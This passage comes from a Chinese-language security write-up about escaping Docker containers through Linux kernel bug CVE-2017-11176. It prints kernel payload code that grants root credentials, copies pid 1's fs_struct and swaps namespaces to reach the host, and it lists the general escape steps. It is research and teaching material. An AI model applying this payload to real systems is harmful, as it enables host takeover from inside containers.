@@ -1,0 +1,158 @@
+        /* Real parent process: */
+        struct task_struct __rcu    *real_parent;
+        /* Recipient of SIGCHLD, wait4() reports: */
+        struct task_struct __rcu    *parent;
+        /* ... */
+        /* Filesystem information: */
+        struct fs_struct        *fs;
+        /* ... */
+    }
+可以看到有一个struct fs_struct *fs结构指针，它的描述为Filesystem information。再看看struct
+fs_struct的内容
+    struct fs_struct {
+        int users;
+        spinlock_t lock;
+        seqcount_t seq;
+        int umask;
+        int in_exec;
+        struct path root, pwd;
+    } __randomize_layout;
+这个结构中的struct path root, pwd就是代表当前进程的根目录以及工作目录。
+task_struct->fs 存放着进程根目录以及工作目录，而我们能够用 task_struct->real_parent 回溯取得父进程的
+task_struct，我们不断往上回溯，直到找到定位到pid=1的进程，也就是当前这个容器在宿主机中的初始进程，把这个初始进程的fs_struct复制到我们的利用程序进程，就可以将我们的漏洞利用进程的根目录设置到宿主机中了！
+代码体现如下
+    static void getroot(void)
+    {
+        commit_creds(prepare_kernel_cred(NULL));//将当前进程设置为root权限
+        void * userkpid = find_get_pid(userpid);
+        struct task_struct *mytask = pid_task(userkpid,PIDTYPE_PID);//获取当前进程的task_struct结构体
+        //循环编译task_struct链，找到pid=1的进程的task_struct的结构体
+        char *task;
+        char *init;
+        uint32_t pid_tmp = 0;
+        task = (char *)mytask;
+        init = task;
+        while (pid_tmp != 1) {
+              init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
+              pid_tmp = *(uint32_t *)(init + TASK_PID_OFFSET);
+        }
+        //将pid=1的task struct的fs_struct结构复制为当前进程的fs_struct
+        *(uint64_t *)((uint64_t)mytask + TASK_FS_OFFSET) = copy_fs_struct(*(uint64_t *)((uint64_t)init + TASK_FS_OFFSET));
+    }
+用 while循环不断回溯task_struct->real_parent找到Init process，之后调用copy_fs_struct函数把
+fs_struct复制到漏洞利用进程，就能进入宿主机的目录了。
+在漏洞利用程序中添加完上面的代码，我们再一次执行漏洞利用程序。
+显然我们已经跑到宿主机中来了，已经实现了容器逃逸。本文基本到此结束了。
+关机下班！但是当我们准备执行shutdown -h now命令时，发现找不到shutdown命令。
+从图中可以看到我们也无法kill掉任何进程，也无法执行一些命令。虽然我们已经逃逸成功了，但是出现的这些小问题又是什么原因导致的呢？
+shutdown找不到可以理解，shutdown是在/sbin目录下，这里是环境变量没有设置的原因，所以找不到shutdown，可以通过/sbin/shutdown直接执行。
+#### 3.2.3 突破namesapce
+Linux 容器利用了 Linux 命名空间的基本虚拟化概念。命名空间是 Linux 内核的一个特性，它在操作系统级别对内核资源进行分区。Docker
+容器使用 Linux 内核命名空间来限制任何用户（ **包括 root** ）直接访问机器的资源。
+有没有可能是因为namespace限制的呢？如果是namespace的原因，那有没有办法改变漏洞利用进程的namespace呢？
+通过查找资料，找到了一种切换namespace的方案。
+命名空间在内核里被抽象成为一个数据结构 struct nsproxy， 其定义如下
+    struct nsproxy {
+        atomic_t count;
+        struct uts_namespace *uts_ns;
+        struct ipc_namespace *ipc_ns;
+        struct mnt_namespace *mnt_ns;
+        struct pid_namespace *pid_ns_for_children;
+        struct net          *net_ns;
+        struct time_namespace *time_ns;
+        struct time_namespace *time_ns_for_children;
+        struct cgroup_namespace *cgroup_ns;
+    };
+在task_struct结构中，存在一项struct nsproxy *nsproxy指向当前进程所属的namespace。
+    struct task_struct {
+        ......
+        /* namespaces */
+        struct nsproxy *nsproxy;
+        ......
+    }
+与上一节替换fs_struct结构相似，我们需要想办法替换这个结构。
+系统初始化时，会初始化一个全局的命名空间， **init_nsproxy** 。替换方案就是将漏洞利用进程的nsproxy替换为init_nsproxy。
+代码体现如下
+    static void getroot(void)
+    {
+        commit_creds(prepare_kernel_cred(NULL));//将当前进程设置为root权限
+        void * userkpid = find_get_pid(userpid);
+        struct task_struct *mytask = pid_task(userkpid,PIDTYPE_PID);//获取当前进程的task_struct结构体
+        //循环编译task_struct链，找到pid=1的进程的task_struct的结构体
+        char *task;
+        char *init;
+        uint32_t pid_tmp = 0;
+        task = (char *)mytask;
+        init = task;
+        while (pid_tmp != 1) {
+              init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
+              pid_tmp = *(uint32_t *)(init + TASK_PID_OFFSET);
+        }
+        //将pid=1的task struct的fs_struct结构复制为当前进程的fs_struct
+        *(uint64_t *)((uint64_t)mytask + TASK_FS_OFFSET) = copy_fs_struct(*(uint64_t *)((uint64_t)init + TASK_FS_OFFSET));
+        //切换当前进程的namespace为pid=1的进程的namespace
+        unsigned long long g = find_task_by_vpid(1);
+        switch_task_namespaces(( void *)g, (void *)INIT_NSPROXY);
+        long fd_mnt = do_sys_open( AT_FDCWD, "/proc/1/ns/mnt", O_RDONLY, 0);
+        setns( fd_mnt, 0);
+        long fd_pid = do_sys_open( AT_FDCWD, "/proc/1/ns/pid", O_RDONLY, 0);
+        setns( fd_pid, 0);
+    }
+上述替换namespace的代码部分,就是先将容器中pid=1的进程的namespace用switch_task_namespaces函数替换为init_nsproxy，之后漏洞程序进程再执行setns函数加入pid=1的进程的namespace，相当于加入init_nsproxy。
+switch_task_namespaces函数代码如下
+    void switch_task_namespaces(struct task_struct *p, struct nsproxy *new)
+    {
+        struct nsproxy *ns;
+        might_sleep();
+        task_lock(p);
+        ns = p->nsproxy;
+        p->nsproxy = new;
+        task_unlock(p);
+        if (ns)
+            put_nsproxy(ns);
+    }
+switch_task_namespaces这个函数就是将参数一struct task_struct
+*p的namespace修改为参数二传进来的namespace。
+在漏洞利用程序中添加完上面的代码，我们再一次执行漏洞利用程序。
+当梦想照进现实，你满怀期待迎接阳光，现实却给你泼了一滩冰水。
+很遗憾，没有成功突破namesapce。:(
+是什么原因呢？我修改上述漏洞程序代码
+    static void getroot(void)
+    {
+        commit_creds(prepare_kernel_cred(NULL));//将当前进程设置为root权限
+        void * userkpid = find_get_pid(userpid);
+        struct task_struct *mytask = pid_task(userkpid,PIDTYPE_PID);//获取当前进程的task_struct结构体
+        //循环编译task_struct链，找到pid=1的进程的task_struct的结构体
+        char *task;
+        char *init;
+        uint32_t pid_tmp = 0;
+        task = (char *)mytask;
+        init = task;
+        while (pid_tmp != 1) {
+              init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
+              pid_tmp = *(uint32_t *)(init + TASK_PID_OFFSET);
+        }
+        //将pid=1的task struct的fs_struct结构复制为当前进程的fs_struct
+        *(uint64_t *)((uint64_t)mytask + TASK_FS_OFFSET) = copy_fs_struct(*(uint64_t *)((uint64_t)init + TASK_FS_OFFSET));
+        //切换当前进程的namespace为pid=1的进程的namespace
+        unsigned long long g = find_task_by_vpid(userpid);
+        switch_task_namespaces(( void *)g, (void *)INIT_NSPROXY);
+    }
+直接切换当前进程的namespace。并且在漏洞程序完成利用从内核退出时通过命令ls /proc/$(userpid)/ns
+-lia打印当前进程的namespace,将结果与宿主机中高权限进程的namespace对比。
+可以看到，我们成功替换了namespace。
+继续在漏洞程序完成利用从内核退出时通过命令ls /home/test打印目录内容，发现可以看到宿主机的文件，说明我们逃逸成功了
+继续在漏洞程序完成利用从内核退出时通过命令kill -9
+pid尝试kill掉某个我们事先已知的进程，测试发现我们也可以成功kill掉，说明我们成功突破了namespace。
+只是在漏洞程序结尾时调用execve弹root shell时会失败，暂时不能弹出一个方便操作的root shell。
+虽然我这边没有成功弹出一个方便的root
+shell，原因暂时没有分析出来，但这个思路是可行的。查阅资料时有人在ubuntu上测试成功了，估计和我测试时的操作系统有关，需要进一步分析。
+### 3.3 一般步骤
+经过上述的一系列尝试，我们可以总结一下利用内核漏洞进行容器逃逸的一般步骤。
+1.使用内核漏洞进入内核上下文 2.获取当前进程的task struct 3.回溯task list 获取pid=1的task
+struct，复制其fs_struct结构数据为当前进程的fs_struct。fs_struct结构中定义了当前进程的根目录和工作目录。
+4.切换当前namespace。Docker使用了Linux内核名称空间来限制用户(包括root)直接访问机器资源。 5.打开root shell，完成逃逸
+## 4 结语
+本文介绍了利用Linux内核漏洞进行Docker容器逃逸，使用的漏洞是CVE-2017-11176,在最新版的docker上逃逸成功了。虽然在突破namespace的限制时遇到了一点小问题，但本次基本实现了利用Linux内核漏洞完成Docker容器逃逸，希望这篇文章给能大家带来一些帮助。
+## 5 参考链接
+* * *
